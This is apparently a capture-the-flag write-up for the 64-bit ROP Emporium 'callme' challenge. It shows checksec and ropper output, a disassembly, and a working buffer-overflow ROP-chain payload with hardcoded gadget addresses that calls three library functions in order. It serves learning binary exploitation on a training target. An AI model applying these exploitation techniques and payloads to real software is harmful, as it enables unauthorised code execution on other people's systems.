# callme

64bit of the challenge

The further we go on the challenges, the less I will explain in order not to repeat the same information. Feel free to search anything that isn't clear, I will do my best to always leave good pointers for further research.

## First moves

As usual, we want to check the file and see what we're handling.

`file`

```bash
└─$ file callme
callme: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=e8e49880bdcaeb9012c6de5f8002c72d8827ea4c, not stripped
```

This challenge also came with its own shared lib

```bash
└─$ file libcallme.so
libcallme.so: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, BuildID[sha1]=be0ff85ee2d8ff280e7bc612bb2a2709737e8881, not stripped
```

`checksec`

```bash
└─$ checksec --file=callme
[*] '/home/kali/my_challenges/pwn/ropemporium/02-callme/64bit/callme'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    RUNPATH:    b'.'
    Stripped:   No
```

with a little manual fuzzing, we can see it's vulnerable to buffer overflows.

## Lay of the land

We already did all the analysis we needed in the 32bit version. It's the same binary here so there is no need to re-analyize. We already know the functions to call, in what order, and their input.

There are three differences though:

1. The arguments are passed through registers instead of pushing them into the stack. You can see this happening in usefulFunction below (this is true for the first 6 arguments in the 64bit calling convention)
2. The input is now doubled, since it's 8 bytes instead of 4 bytes. (i.e instead of 0xdeadbeef, we will give it 0xdeadbeefdeadbeef and so on)
3. We need to be careful with the stack alignment. Some instructions in the 64bit calling convention require that the stack is 16byte-aligned. (e.x the instruction `moveaps`)

```python
                             **************************************************************
                             *                          FUNCTION                          *
                             **************************************************************
                             undefined usefulFunction()
             undefined         AL:1           <RETURN>
                             usefulFunction                                  XREF[2]:     00400a58, 00400b38(*)
        004008f2 55              PUSH       RBP
        004008f3 48 89 e5        MOV        RBP,RSP
        004008f6 ba 06 00        MOV        EDX,0x6
                 00 00
        004008fb be 05 00        MOV        ESI,0x5
                 00 00
        00400900 bf 04 00        MOV        EDI,0x4
                 00 00
        00400905 e8 e6 fd        CALL       <EXTERNAL>::callme_three                         undefined callme_three()
                 ff ff
        0040090a ba 06 00        MOV        EDX,0x6
                 00 00
        0040090f be 05 00        MOV        ESI,0x5
                 00 00
        00400914 bf 04 00        MOV        EDI,0x4
                 00 00
        00400919 e8 22 fe        CALL       <EXTERNAL>::callme_two                           undefined callme_two()
                 ff ff
        0040091e ba 06 00        MOV        EDX,0x6
                 00 00
        00400923 be 05 00        MOV        ESI,0x5
                 00 00
        00400928 bf 04 00        MOV        EDI,0x4
                 00 00
        0040092d e8 ee fd        CALL       <EXTERNAL>::callme_one                           undefined callme_one()
                 ff ff
        00400932 bf 01 00        MOV        EDI,0x1
                 00 00
        00400937 e8 14 fe        CALL       <EXTERNAL>::exit                                 void exit(int __status)
                 ff ff
                             -- Flow Override: CALL_RETURN (CALL_TERMINATOR)
```

```bash
└─$ ropper --file callme --search "pop rdi"
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rdi

[INFO] File: callme
0x000000000040093c: pop rdi; pop rsi; pop rdx; ret;
0x00000000004009a3: pop rdi; ret;
```

`0x000000000040093c: pop rdi; pop rsi; pop rdx; ret;` This is a nice gadget for passing the arguments.

```bash
└─$ ropper --file callme --search "ret"
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: ret

[INFO] File: callme
0x00000000004006be: ret;
```

This ret gadget is in case we need to align the stack.

## Attack plan

1. Find offset to return address.
2. Find addresses of callme\_\*.
3. Find gadgets to pop arguments into registers
4. Write them into the stack in correct order.

## Exploit

### Manual

The payload structure will look like:
We used cyclic pattern for the offset and we found that it is at 40 this time around.

```bash
python2 -c '
print "a"*40 + \
      "gadget_pop_3" + \
      "arg1" + \
      "arg2" + \
      "arg3" + \
      "callme_one_addr" + \
      "gadget_pop_3" + \
      "arg1" + \
      "arg2" + \
      "arg3" + \
      "callme_two_addr" + \
      "gadget_pop_3" + \
      "arg1" + \
      "arg2" + \
      "arg3" + \
      "callme_three_addr" + \
      "optional: exit_address" \
' > payload
```

If we're planning to call anything in libc such as `system` It would be a good idea to insert a `ret` instruction to realign the stack just before calling a libc function.

```bash
python2 -c '
print "a"*40 + \
      "\x3c\x09\x40\x00\x00\x00\x00\x00" + \
      "\xef\xbe\xad\xde\xef\xbe\xad\xde" + \
      "\xbe\xba\xfe\xca\xbe\xba\xfe\xca" + \
      "\x0d\xf0\x0d\xd0\x0d\xf0\x0d\xd0" + \
      "\x20\x07\x40\x00\x00\x00\x00\x00" + \
      "\x3c\x09\x40\x00\x00\x00\x00\x00" + \
      "\xef\xbe\xad\xde\xef\xbe\xad\xde" + \
      "\xbe\xba\xfe\xca\xbe\xba\xfe\xca" + \
      "\x0d\xf0\x0d\xd0\x0d\xf0\x0d\xd0" + \
      "\x40\x07\x40\x00\x00\x00\x00\x00" + \
      "\x3c\x09\x40\x00\x00\x00\x00\x00" + \
      "\xef\xbe\xad\xde\xef\xbe\xad\xde" + \
      "\xbe\xba\xfe\xca\xbe\xba\xfe\xca" + \
      "\x0d\xf0\x0d\xd0\x0d\xf0\x0d\xd0" + \
      "\xf0\x06\x40\x00\x00\x00\x00\x00" + \
      "CCCCCCCC" \
' > payload
```

Probably the last time I'm writing this manually... BUT it really cemented the learning by doing so!

### Pwntools

Check out `exploit.py` and `exploit_rop.py`.
